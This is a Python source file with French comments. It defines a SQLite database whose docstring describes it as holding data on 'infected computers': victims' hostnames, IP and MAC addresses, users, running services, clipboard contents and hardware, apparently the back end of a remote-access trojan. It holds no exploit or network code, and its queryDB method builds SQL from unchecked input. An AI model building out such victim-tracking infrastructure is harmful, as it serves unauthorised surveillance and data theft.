#!/usr/bin/env python
#coding=utf-8
__author__ = "Karl Boulais"

import sqlite3
import datetime
from threading import Lock

from enum import Enum, auto

class SqlCommand(Enum):
    '''
        Pour accéder au nom d'un Enum on sélectionne la SqlCommand.NomEnum.name
        Pour accéder a la valeur d'un Enum on sélectionne la SqlCommand.NomEnum.value
    '''
    def __str__(self):
        return self.value

    CREATE_CLIENTS = '''
    CREATE TABLE IF NOT EXISTS clients
    (
        HOSTNAME            TEXT NOT NULL,
        LOCALIP             TEXT NOT NULL,
        PUBLICIP            TEXT NOT NULL,
        MAC                 TEXT NOT NULL,
        USERS               TEXT NOT NULL,
        RUNNINGSERVICES     TEXT NOT NULL,
        ARCH                TEXT NOT NULL,
        PCINFO              TEXT,
        CLIPBOARD           BLOB,
        DISKS               TEXT NOT NULL,
        GPU                 TEXT NOT NULL,
        CREATION_TIME       TEXT NOT NULL,
        MODIFICATION_TIME   TEXT,
        PRIMARY KEY(HOSTNAME, LOCALIP, PUBLICIP, MAC)
    )
    '''
    DROP_CLIENT   = 'DROP TABLE IF EXISTS clients'

    INSERT_CLIENT = 'INSERT INTO clients VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
    UPDATE_CLIENT = ''' 
    UPDATE clients SET 
    
    USERS             = ?,         
    RUNNINGSERVICES   = ?,
    ARCH              = ?,  
    PCINFO            = ?,  
    CLIPBOARD         = ?,  
    DISKS             = ?,  
    GPU               = ?, 
    MODIFICATION_TIME = ?

    WHERE HOSTNAME = ? AND  LOCALIP = ? AND PUBLICIP = ? AND  MAC = ? 

    '''

    SELECT_ALL_CLIENTS = "SELECT * FROM clients"

    GET_TABLE_INFO = "PRAGMA table_info(clients)"

    

class Columns(Enum):
    
    r'''    
        Pour sélectionner la liste Columns.COLUMN_TITLE_LIST.value

        Pour sélectionner un élément de la liste Columns.COLUMN_TITLE_LIST.value[index] 
    '''
    def __str__(self):
        return self.name

    HOSTNAME            = auto()          
    LOCALIP             = auto()  
    PUBLICIP            = auto() 
    MAC                 = auto()
    USERS               = auto()
    RUNNINGSERVICES     = auto() 
    ARCH                = auto()
    PCINFO              = auto()
    CLIPBOARD           = auto()
    DISKS               = auto()
    GPU                 = auto()
    CREATION_TIME       = auto()
    MODIFICATION_TIME   = auto()

    

class Dao():
    """ Base de donnée contenant les informations des ordinnateurs infectés """

    def __init__(self):
        self.db = 'DATABASE.db'
        self._connect()

    def _connect(self):
        with Lock():
            self.connection  = sqlite3.connect(self.db)
            self.cursor      = self.connection.cursor()

    def _disconnect(self):
        self.cursor.close()
        self.connection.close()

    def _createDb(self):
        self.cursor.execute(str(SqlCommand.DROP_CLIENT))
        self.cursor.execute(str(SqlCommand.CREATE_CLIENTS))
    
    def _insertClient(self, data):
        self.cursor.execute(str(SqlCommand.INSERT_CLIENT), data)
        self.connection.commit()

    def _getAllClients(self):
        self.cursor.execute(str(SqlCommand.SELECT_ALL_CLIENTS))
        return self.cursor.fetchall()

    def _updateClients(self, data):
        self.cursor.execute(str(SqlCommand.UPDATE_CLIENT), data)
        self.connection.commit()


    
    def _getColumnTitle(self):
        self.cursor.execute(str(SqlCommand.GET_TABLE_INFO))
        columnTitle = []
        for column in self.cursor.fetchall():
            columnTitle.append(column[1])
        
        return columnTitle 

    def _prepInsert(self, data):
        dataList = []
        for _,v in data.items():
            dataList.append(v)
        # Creation time
        dataList.append(str(datetime.datetime.now()))
        # Modification time
        dataList.append(None)
        return tuple(dataList)
    
    def _prepUpdate(self, data):
        dataList = []
        primaryKeys = ["HOSTNAME", "LOCALIP", "PUBLICIP", "MAC"]
        primaryValue = []
        for k,v in data.items():
            if k in primaryKeys:
                primaryValue.append(v)
            else:
                dataList.append(v)
        # Modification time
        dataList.append(str(datetime.datetime.now()))
        for value in primaryValue: dataList.append(value)
        return tuple(dataList)


    def insertNewClient(self, data):
        try:
            self._insertClient(self._prepInsert(data))
        except sqlite3.IntegrityError:
            self._updateClients(self._prepUpdate(data))
        except sqlite3.OperationalError:
            self._createDb()
            self._insertClient(self._prepInsert(data))
        self._disconnect()
    
    def printAllClient(self):
        for row in self._getAllClients():
            for elem in row:
                print(list(Columns)[row.index(elem)])
                print(elem, "\n")
        self._disconnect()
    
    def queryDB(self, value):
        self.cursor.execute(f'SELECT {value} FROM clients')
        for row in self.cursor.fetchall():
            for elem in row:
                print(elem, "\n")
        self._disconnect()
    
    def main(self):
        self.printAllClient()




    
if __name__ == "__main__":
    Dao().main()